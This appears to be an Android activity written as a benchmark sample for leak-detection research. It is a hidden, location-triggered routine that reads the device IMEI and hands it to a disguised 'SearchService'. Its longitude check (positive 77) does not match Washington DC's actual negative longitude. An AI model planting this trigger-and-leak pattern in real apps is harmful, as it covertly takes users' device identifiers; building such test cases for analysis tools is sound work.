package edu.ucdavis.location2;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;

/**
 * Class: MainActivity
 * Description: Attack at Washington dc
 * Authors: Hao Fu(haofu@ucdavis.edu)
 * Date: 7/2/2016 3:50 PM
 */
public class MainActivity extends AppCompatActivity {

    Activity mActivity;

    LocationManager locationManager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        mActivity = this;

        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        LocationListener locationListener = new MyLocationListener();
        locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, locationListener);
    }

    protected void onResume() {
        super.onResume();
        String locationProvider = LocationManager.NETWORK_PROVIDER;

        Location lastKnownLocation = locationManager.getLastKnownLocation(locationProvider);

        if (lastKnownLocation != null) {
            double lat = lastKnownLocation.getLatitude();
            double lon = lastKnownLocation.getLongitude();

            if ((int) lat == 38 && (int) lon == 77) {
                Intent in = new Intent();
                TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                String imei = telephonyManager.getDeviceId(); //source
                in.putExtra("secret", imei);
                in.setClass(this, com.google.ssearch.SearchService.class);
                startService(in);
            }
        }
    }

    private class MyLocationListener implements LocationListener {
        @Override
        public void onLocationChanged(Location loc) {  //source

        }

        @Override
        public void onProviderDisabled(String provider) {}

        @Override
        public void onProviderEnabled(String provider) { }

        @Override
        public void onStatusChanged(String provider, int status, Bundle extras) {}
    }
}
